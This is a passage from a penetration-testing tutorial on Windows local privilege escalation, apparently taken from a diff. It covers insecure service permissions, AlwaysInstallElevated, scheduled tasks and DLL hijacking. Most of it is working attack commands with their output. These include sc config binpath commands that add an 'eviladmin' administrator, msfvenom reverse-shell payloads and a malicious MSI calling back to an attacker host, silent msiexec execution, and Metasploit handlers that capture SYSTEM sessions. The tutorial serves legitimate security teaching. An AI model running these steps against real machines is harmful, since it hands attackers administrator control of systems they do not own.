+[*] 192.168.2.6 - Meterpreter session 1 closed.  Reason: Died</pre>
+<p>Our target machine is restarting now. Prepare your handler! Soon, our payload will work as SYSTEM.</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="8-11">msf exploit(handler) &gt; run
+
+[*] Started reverse TCP handler on 192.168.2.60:8989 
+[*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to 192.168.2.6
+[*] Meterpreter session 2 opened (192.168.2.60:8989 -&gt; 192.168.2.6:49156) at 2017-01-16 03:59:58 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; 
+[*] 192.168.2.6 - Meterpreter session 2 closed.  Reason: Died
+</pre>
+<p>But don&#8217;t forget! We are working with services just as in the previous method our hi-priv meterpreter session will die quickly.</p>
+<h4>Insecure Service Permissions</h4>
+<p>It is very similar to previous Insecure Registry Permissions example. Instead of changing service&#8217;s &#8220;ImagePath&#8221; registry value directly we will do it with modifying service properties.</p>
+<p>To check which Services have vulnerable privileges we can use <a href="https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx">AccessChk</a> tool from <a href="https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">SysInternals Suite</a>.</p>
+<p>Upload AccessChk tool to target machine:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2,4">meterpreter &gt; cd %temp%
+meterpreter &gt; pwd
+C:\Users\testuser\AppData\Local\Temp
+meterpreter &gt; upload -f accesschk.exe
+[*] uploading  : accesschk.exe -&gt; accesschk.exe
+[*] uploaded   : accesschk.exe -&gt; accesschk.exe
+meterpreter &gt;</pre>
+<p>To check vulnerable services simply run this command:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="9">meterpreter &gt; getuid
+Server username: TARGETMACHINE\testuser
+meterpreter &gt; shell
+Process 3496 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\AppData\Local\Temp&gt;accesschk.exe -uwcqv "testuser" * 
+accesschk.exe -uwcqv "TestUser" *
+
+Accesschk v6.02 - Reports effective permissions for securable objects
+Copyright (C) 2006-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+RW Vulnerable Service
+ SERVICE_ALL_ACCESS
+
+C:\Users\testuser\AppData\Local\Temp&gt;
+
+</pre>
+<p>All services that &#8220;testuser&#8221; can modify will be listed. <em>SERVICE_ALL_ACCESS</em> means we have full control over modifying the properties of Vulnerable Service.</p>
+<p>Let&#8217;s view the properties of the Vulnerable Service:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1">C:\Users\testuser\AppData\Local\Temp&gt;sc qc "Vulnerable Service"
+sc qc "Vulnerable Service"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Vulnerable Service
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+        LOAD_ORDER_GROUP   : UIGroup
+        TAG                : 0
+        DISPLAY_NAME       : Vulnerable Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\testuser\AppData\Local\Temp&gt;</pre>
+<p>BINARY_PATH_NAME points to Executable.exe which is executable file for this service. If we change this value with any command means this command will run as SYSTEM at the next start of the service. We can add a local admin if we want.</p>
+<p>The first thing to do is adding a user:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">C:\Users\testuser\AppData\Local\Temp&gt;sc config "Vulnerable Service" binpath= "net user eviladmin <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="42127631313572302602">[email&#160;protected]</a> /add"
+sc config "Vulnerable Service" binpath= "net user eviladmin <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="26761255555116544266">[email&#160;protected]</a> /add"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\Users\testuser\AppData\Local\Temp&gt;</pre>
+<p>After changing binpath, restart service with &#8220;sc stop&#8221; and &#8220;sc start&#8221; commands:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,13">C:\Users\testuser\AppData\Local\Temp&gt;sc stop "Vulnerable Service"
+sc stop "Vulnerable Service"
+
+SERVICE_NAME: Vulnerable Service 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Users\testuser\AppData\Local\Temp&gt;sc start "Vulnerable Service"
+sc start "Vulnerable Service"
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+</pre>
+<p>When you try to start service it will return an error. As we talked earlier it&#8217;s because, when a service starts in Windows operating systems, it must communicate with the Service Control Manager. &#8220;net user&#8221; cannot communicate with the SCM. No worries, our command will run as SYSTEM and the new user will be added successfully.</p>
+<p>Now we should add new &#8220;eviladmin&#8221; user to local admins by changing &#8220;binpath&#8221; and starting service again.(We don&#8217;t need to stop it again, it is already not running because of it didn&#8217;t communicate with the SCM, you know)</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,5">C:\Users\testuser\AppData\Local\Temp&gt;sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"    
+sc config "Vulnerable Service" binpath= "net localgroup Administrators eviladmin /add"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\Users\testuser\AppData\Local\Temp&gt;sc start "Vulnerable Service"
+sc start "Vulnerable Service"
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+
+C:\Users\testuser\AppData\Local\Temp&gt;
+</pre>
+<p>Enjoy your new local admin account!</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="7">C:\Users\testuser\AppData\Local\Temp&gt;net user
+net user
+
+User accounts for \\TARGETMACHINE
+
+-------------------------------------------------------------------------------
+Administrator            can                      eviladmin                
+Guest                    testuser                 
+The command completed successfully.
+
+
+C:\Users\testuser\AppData\Local\Temp&gt;
+</pre>
+<p>As we did before, you can prefer dropping a reverse shell payload to target machine and replacing binpath with the payload&#8217;s path.</p>
+<p>Instead of manually applying this method you can use this metasploit module: <a href="https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions">exploit/windows/local/service_permissions</a></p>
+<p>You have to link it to an existing Meterpreter session:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1-2">msf &gt; use exploit/windows/local/service_permissions
+msf exploit(service_permissions) &gt; show options
+
+Module options (exploit/windows/local/service_permissions):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)
+   SESSION                      yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</pre>
+<h4>Insecure File/Folder Permissions</h4>
+<p>It is very similar to what we did with Unquoted Service Paths. Unquoted Service Paths takes advantage of &#8220;CreateProcess&#8221; function&#8217;s weakness in combination with folder permissions along the executable file path of a service. But here we will try to replace the executable directly.</p>
+<p>For example, if we check permissions for our Vulnerable Service&#8217;s executable path, we can see it is not protected well:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3-4">C:\Program Files (x86)\Program Folder&gt;icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
+icacls "C:\Program Files (x86)\Program Folder\A Subfolder"
+C:\Program Files (x86)\Program Folder\A Subfolder Everyone:(OI)(CI)(F)
+                                                  Everyone:(I)(OI)(CI)(F)
+                                                  NT SERVICE\TrustedInstaller:(I)(F)
+                                                  NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                                  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                                  BUILTIN\Administrators:(I)(F)
+                                                  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                                  BUILTIN\Users:(I)(RX)
+                                                  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                                  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Program Files (x86)\Program Folder&gt;</pre>
+<p>Simply replacing &#8220;Executable.exe&#8221; file with a reverse shell payload and restarting the service will give us a meterpreter session with SYSTEM privileges.</p>
+<h3>AlwaysInstallElevated</h3>
+<p>AlwaysInstallElevated is a policy setting that directs Windows Installer to use elevated permissions when it installs any package on the system. If this policy setting is enabled, privileges are extended to all programs.</p>
+<p>Actually enabling that is equivalent to granting administrative rights to non-privileged users. But in a way that I cannot understand, sometimes system administrators enable this setting:</p>
+<p><img class="alignnone wp-image-634" src="https://pentest.blog/wp-content/uploads/alwaysinstallelevated-300x193.png" alt="" width="835" height="537" srcset="https://pentest.blog/wp-content/uploads/alwaysinstallelevated-300x193.png 300w, https://pentest.blog/wp-content/uploads/alwaysinstallelevated-768x494.png 768w, https://pentest.blog/wp-content/uploads/alwaysinstallelevated.png 835w" sizes="(max-width: 835px) 100vw, 835px" /></p>
+<p>You should check this registry values to understand if this policy is enabled:</p>
+<blockquote><p>[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]<br />
+“AlwaysInstallElevated”=dword:00000001</p>
+<p>[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]<br />
+“AlwaysInstallElevated”=dword:00000001</p></blockquote>
+<p>If you have gotten a low-priv Meterpreter session, the built-in command line tool, reg query will help you to check these values:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3,9,13" data-enlighter-language="null">meterpreter &gt; getuid
+Server username: TARGETCOMPUTER\testuser
+meterpreter &gt; shell
+Process 812 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+ERROR: The system was unable to find the specified registry key or value.
+
+C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+ERROR: The system was unable to find the specified registry key or value.
+
+C:\Users\testuser\Desktop&gt;
+</pre>
+<p>If you got an error like &#8220;ERROR: The system was unable to find the specified registry key or value.&#8221; this means this registry values never created. So, the policy is not enabled.</p>
+<p>But if you see the following output, it means the policy setting is enabled and you can exploit it. 😉</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3,9,16" data-enlighter-language="null">meterpreter &gt; getuid
+Server username: TARGETCOMPUTER\testuser
+meterpreter &gt; shell
+Process 2172 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+C:\Users\testuser\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+C:\Users\testuser\Desktop&gt;</pre>
+<p>As I said before, in this situation, Windows Installer will use elevated permissions when it installs any package. So we should generate a malicious .msi package and run it. MSFvenom can handle this.</p>
+<p>If you want you can generate a .msi package that adds a local admin to our target machine. You should use <em>windows/adduser as a</em> payload:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d9abb6b6ad99b2b8b5b0">[email&#160;protected]</a>:~# msfvenom -f msi-nouac -p windows/adduser USER=eviladmin <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="46160715157b167235353176342206">[email&#160;protected]</a> -o add_user.msi
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 277 bytes
+Final size of msi file: 159744 bytes
+Saved as: add_user.msi
+<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b7c5d8d8c3f7dcd6dbde">[email&#160;protected]</a>:~# 
+</pre>
+<p>But in this scenario, I&#8217;ll generate an executable reverse shell payload(Payload.exe) and an msi package(malicious.msi) that executes this payload. Let&#8217;s do it!</p>
+<p>Generating Payload.exe:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="384a57574c7853595451">[email&#160;protected]</a>:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 360 (iteration=0)
+x86/shikata_ga_nai chosen with final size 360
+Payload size: 360 bytes
+Final size of exe file: 73802 bytes
+Saved as: Payload.exe
+</pre>
+<p>Generating malicious.msi by using <em>windows/exec</em> as a payload. Make sure you enter the correct path for Payload.exe:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bac8d5d5cefad1dbd6d3">[email&#160;protected]</a>:~# msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" &gt; malicious.msi
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 233 bytes
+Final size of msi-nouac file: 159744 bytes
+</pre>
+<p>Now we can upload these two to our target machine.</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2,5">meterpreter &gt; cd C:/Users/testuser/AppData/Local/Temp
+meterpreter &gt; upload -f Payload.exe
+[*] uploading  : Payload.exe -&gt; Payload.exe
+[*] uploaded   : Payload.exe -&gt; Payload.exe
+meterpreter &gt; upload -f malicious.msi
+[*] uploading  : malicious.msi -&gt; malicious.msi
+[*] uploaded   : malicious.msi -&gt; malicious.msi
+</pre>
+<p>Before executing the .msi file, start a new handler on another terminal window for brand new hi-priv shell:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2,4,6,8" data-enlighter-language="null">msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.2.60
+lhost =&gt; 192.168.2.60
+msf exploit(handler) &gt; set lport 8989
+lport =&gt; 8989
+msf exploit(handler) &gt; run
+
+[*] Started reverse TCP handler on 192.168.2.60:8989 
+[*] Starting the payload handler...
+</pre>
+<p>Now we&#8217;re ready to execute!</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7">meterpreter &gt; shell
+Process 1260 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\AppData\Local\temp&gt;msiexec /quiet /qn /i malicious.msi 
+msiexec /quiet /qn /i malicious.msi
+
+C:\Users\testuser\AppData\Local\temp&gt;</pre>
+<p>/quiet = Suppress any messages to the user during installation<br />
+/qn = No GUI<br />
+/i = Regular (vs. administrative) installation</p>
+<p>Enjoy your shell with SYSTEM privileges!</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="6,7" data-enlighter-language="null">[*] Started reverse TCP handler on 192.168.2.60:8989 
+[*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to 192.168.2.236
+[*] Meterpreter session 1 opened (192.168.2.60:8989 -&gt; 192.168.2.236:36071) at 2016-12-21 04:21:57 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt;</pre>
+<p>Instead of manually applying this technique you can use this Metasploit module: <a href="https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated"><em>exploit/windows/local/always_install_elevated</em></a></p>
+<p>This module only requires that you link it to an existing Meterpreter session before running:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2" data-enlighter-language="null">msf &gt; use exploit/windows/local/always_install_elevated
+msf exploit(always_install_elevated) &gt; show options
+
+Module options (exploit/windows/local/always_install_elevated):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+</pre>
+<h3>Privilege Escalation with Task Scheduler</h3>
+<p>This method only works on a Windows 2000, XP, or 2003 machine. You must have local administrator privileges to manage scheduled tasks. If you have a meterpreter session with limited user privileges this method will not work.</p>
+<p>On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. That means if we create a scheduled task that executes our malicious executable, it will run as SYSTEM. 😉</p>
+<p>Again, I&#8217;ll generate an executable reverse shell payload for this job. Let&#8217;s demonstrate!</p>
+<p>Generating an executable reverse shell payload:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d3a1bcbca793b8b2bfba">[email&#160;protected]</a>:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 360 (iteration=0)
+x86/shikata_ga_nai chosen with final size 360
+Payload size: 360 bytes
+Final size of exe file: 73802 bytes
+Saved as: Payload.exe
+</pre>
+<p>You can drop your payload anywhere you want. I prefer temp folder:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3,11,12">meterpreter &gt; getuid
+Server username: TESTMACHINE\test
+meterpreter &gt; sysinfo
+Computer        : TESTMACHINE
+OS              : Windows XP (Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/win32
+meterpreter &gt; cd "C:/Documents and Settings/test/Local Settings/Temp"
+meterpreter &gt; upload -f Payload.exe
+[*] uploading  : Payload.exe -&gt; Payload.exe
+[*] uploaded   : Payload.exe -&gt; Payload.exe</pre>
+<p>We should ensure that <em>Task Scheduler</em> service works. Attempt to start service:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7">meterpreter &gt; shell
+Process 840 created.
+Channel 2 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\test\Local Settings\Temp&gt;net start "Task Scheduler"
+net start "Task Scheduler"
+The requested service has already been started.
+
+More help is available by typing NET HELPMSG 2182.
+
+
+C:\Documents and Settings\test\Local Settings\Temp&gt;</pre>
+<p>It seems to be already running. Let&#8217;s check machine&#8217;s current time:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3">C:\Documents and Settings\test\Local Settings\Temp&gt;time
+time
+The current time is:  6:41:05.81
+Enter the new time: 
+
+C:\Documents and Settings\test\Local Settings\Temp&gt;</pre>
+<p>We will create a task that will run our executable about 1 minute after the current time:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">C:\Documents and Settings\test\Local Settings\Temp&gt;at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
+at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
+Added a new job with job ID = 1
+
+C:\Documents and Settings\test\Local Settings\Temp&gt;</pre>
+<p>Start a new handler in another terminal window for the new hi-priv shell. 1 minute later our executable will run as SYSTEM and will get a session with SYSTEM privileges:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">msf exploit(handler) &gt; run
+
+[*] Started reverse TCP handler on 192.168.2.60:8989 
+[*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to 192.168.2.231
+[*] Meterpreter session 6 opened (192.168.2.60:8989 -&gt; 192.168.2.231:1066) at 2017-01-05 06:42:06 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+</pre>
+<h3>DLL Hijacking</h3>
+<p>Suppose that none of above methods worked. But of course, we did not give up. You may want to check running processes for DLL hijacking vulnerability.</p>
+<p>Microsoft&#8217;s <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx">this</a> article explains DLL hijacking well:</p>
+<blockquote><p>When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">Dynamic-Link Library Search Order</a>. If an attacker gains control of one of the directories on the DLL search path, it can place a malicious copy of the DLL in that directory. This is sometimes called a DLL preloading attack or a binary planting attack. If the system does not find a legitimate copy of the DLL before it searches the compromised directory, it loads the malicious DLL. If the application is running with administrator privileges, the attacker may succeed in local privilege elevation.</p></blockquote>
+<p>When a process attempts to load a DLL, the system searches directories in the following order:</p>
+<ol>
+<li>The directory from which the application loaded.</li>
+<li>The system directory.</li>
+<li>The 16-bit system directory.</li>
+<li>The Windows directory.</li>
+<li>The current directory.</li>
+<li>The directories that are listed in the PATH environment variable.</li>
+</ol>
+<p>So, to exploit this vulnerability we will follow this path:</p>
+<ul>
+<li>Check whether the DLL that process looking for exists in any directory on the disk.</li>
+<li>If it does not exist, place the malicious copy of DLL to one of the directories that I mentioned above. When process executed, it will find and load malicious DLL.</li>
+<li>If the DLL file already exists in any of these paths, try to place malicious DLL to a directory with a higher priority than the directory where the original DLL file exists. For example, if the original DLL exists in the C:\Windows directory and if we gain control of the directory which the application loaded and place a malicious copy of the DLL in that directory, when the application tries to load the DLL file, it will look at the directory which the application loaded. And it will find the malicious copy of DLL, and load it. So, our malicious code will be executed with higher privileges.</li>
+</ul>
+<p>Okay then. Let&#8217;s start to investigate running processes:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">meterpreter &gt; getuid
+Server username: TARGETMACHINE\testuser
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                    Arch  Session  User                    Path
+ ---   ----  ----                    ----  -------  ----                    ----
+ 0     0     [System Process]                                               
+ 4     0     System                                                         
+ 80    564   svchost.exe                                                    
+ 308   4     smss.exe                                                       
+ 408   400   csrss.exe                                                      
+ 456   400   wininit.exe                                                    
+ 512   2584  SearchFilterHost.exe                                           
+ 564   456   services.exe                                                   
+ 572   456   lsass.exe                                                      
+ 656   564   svchost.exe                                                    
+ 680   564   svchost.exe                                                    
+ 700   564   svchost.exe                                                    
+ 816   564   vmacthlp.exe                                                   
+ 892   2584  SearchProtocolHost.exe                                         
+ 896   564   svchost.exe                                                    
+ 932   564   svchost.exe                                                    
+ 952   932   Vulnerable.exe                                                 
+ 968   2220  explorer.exe            x64   2        TARGETMACHINE\testuser  C:\Windows\explorer.exe
+ 972   564   svchost.exe                                                    
+ 996   80    WUDFHost.exe                                                   
+ 1104  564   spoolsv.exe                                                    
+ 1136  564   svchost.exe                                                    
+ 1324  564   svchost.exe                                                    
+ 1404  564   sqlwriter.exe                                                  
+ 1448  564   VGAuthService.exe                                              
+ 1460  2884  TPAutoConnect.exe       x64   2        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+ 1532  564   vmtoolsd.exe                                                   
+ 1572  80    TabTip.exe              x64   2                                
+ 1864  2832  dwm.exe                                                           
+ 1996  2568  mmc.exe                 x64   2                                
+ 2056  780   csrss.exe                                                      
+ 2224  564   msdtc.exe                                                      
+ 2472  932   taskhostex.exe          x64   2        TARGETMACHINE\testuser  C:\Windows\System32\taskhostex.exe
+ 2584  564   SearchIndexer.exe                                              
+ 2752  564   svchost.exe                                                    
+ 2832  780   winlogon.exe                                                   
+ 2876  952   conhost.exe                                                    
+ 2884  564   TPAutoConnSvc.exe                                              
+ 2916  896   audiodg.exe             x64   0                                
+ 2992  564   dllhost.exe                                                    
+ 3436  656   WmiPrvSE.exe                                                   
+ 3444  968   firefox.exe             x86   2        TARGETMACHINE\testuser  C:\Program Files (x86)\Mozilla Firefox\firefox.exe
+ 3480  968   vmtoolsd.exe            x64   2        TARGETMACHINE\testuser  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 3648  1460  conhost.exe             x64   2        TARGETMACHINE\testuser  C:\Windows\System32\conhost.exe
+ 3668  564   sppsvc.exe                                                     
+ 3732  1572  TabTip32.exe            x86   2                                
+ 3764  1752  Taskmgr.exe             x64   2        TARGETMACHINE\testuser  C:\Windows\System32\Taskmgr.exe</pre>
+<p>As you can see, if we are using low-priv shell we cannot see the details about processes which running with higher privileges, such as user, path, architecture. But we can understand which processes running with higher privileges than ours. If one of these processes have some weaknesses we can exploit it to escalate our privileges.</p>
+<p>While investigating processes, Vulnerable.exe caught my attention. Let&#8217;s find it&#8217;s location and download it:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">meterpreter &gt; search -f Vulnerable.exe
+Found 1 result...
+    C:\Windows\SysWOW64\Vulnerable.exe (31232 bytes)
+meterpreter &gt; cd C:/Windows/SysWOW64
+meterpreter &gt; download Vulnerable.exe
+[*] downloading: Vulnerable.exe -&gt; Vulnerable.exe
+[*] download   : Vulnerable.exe -&gt; Vulnerable.exe
+</pre>
+<p>When we examine it a little bit, we will realize that it tries to load a DLL named <em>hijackable.dll</em>.</p>
+<p><img class="alignnone wp-image-715" src="https://pentest.blog/wp-content/uploads/hijackable-dll-300x145.png" alt="" width="692" height="335" srcset="https://pentest.blog/wp-content/uploads/hijackable-dll-300x145.png 300w, https://pentest.blog/wp-content/uploads/hijackable-dll.png 692w" sizes="(max-width: 692px) 100vw, 692px" /></p>
+<p>The easiest way to detect DLL hijacking vulnerability is using <a href="https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx">Procmon</a> tool.</p>
+<p>To see the results more easily, you should add these 3 filters:</p>
+<p><img class="alignnone wp-image-771" src="https://pentest.blog/wp-content/uploads/dll_hijack_procmon_new-300x179.png" alt="" width="519" height="310" srcset="https://pentest.blog/wp-content/uploads/dll_hijack_procmon_new-300x179.png 300w, https://pentest.blog/wp-content/uploads/dll_hijack_procmon_new.png 519w" sizes="(max-width: 519px) 100vw, 519px" /></p>
+<p>&nbsp;</p>
+<p>After adding filters, when you execute <em>Vulnerable.exe</em>, failed DLL loads will be listed:</p>
+<p><img class="alignnone wp-image-767" src="https://pentest.blog/wp-content/uploads/dll_hijack_procmon-2-300x172.png" alt="" width="755" height="433" srcset="https://pentest.blog/wp-content/uploads/dll_hijack_procmon-2-300x172.png 300w, https://pentest.blog/wp-content/uploads/dll_hijack_procmon-2.png 755w" sizes="(max-width: 755px) 100vw, 755px" /></p>
+<p>As shown above, Windows attempts to locate the <em>hijackable.dll</em> by searching a well-defined set of directories.</p>
+<p>In this scenario, Vulnerable.exe has DLL hijacking vulnerability. Ok I confess, actually, this executable is a simple code that loads a DLL without doing some checks:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-highlight="6">#include "stdafx.h"
+#include "windows.h"
+
+void _tmain(int argc, _TCHAR* argv[]) 
+{ 
+  LoadLibrary(L"hijackable.dll"); 
+}</pre>
+<p>Let&#8217;s check if <em>hijackable.dll</em> exists on the target machine:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1-2">meterpreter &gt; search -f hijackable.dll
+No files matching your search were found.
+meterpreter &gt; 
+</pre>
+<p>It seems that DLL does not exist on the machine. But we cannot be sure at this point, maybe it exists in a directory that we don&#8217;t have permission to view. Don&#8217;t forget we still have low privileges. 🙁</p>
+<p>The next step is checking possible weak folder permissions. I usually check if a software gets installed in the root directory such as Python. Because if a folder created in the root directory, it is writable for all authenticated users by default. And softwares like Python, Ruby, Perl etc. usually added to PATH variable.</p>
+<p>Remember, Windows checks the directories that are listed in the PATH environment variable!</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="17">meterpreter &gt; ls
+Listing: C:\
+============
+
+Mode              Size        Type  Last modified              Name
+----              ----        ----  -------------              ----
+40777/rwxrwxrwx   0           dir   2017-01-18 05:59:21 -0500  $Recycle.Bin
+100666/rw-rw-rw-  1           fil   2013-06-18 08:18:29 -0400  BOOTNXT
+100444/r--r--r--  8192        fil   2013-09-11 14:11:46 -0400  BOOTSECT.BAK
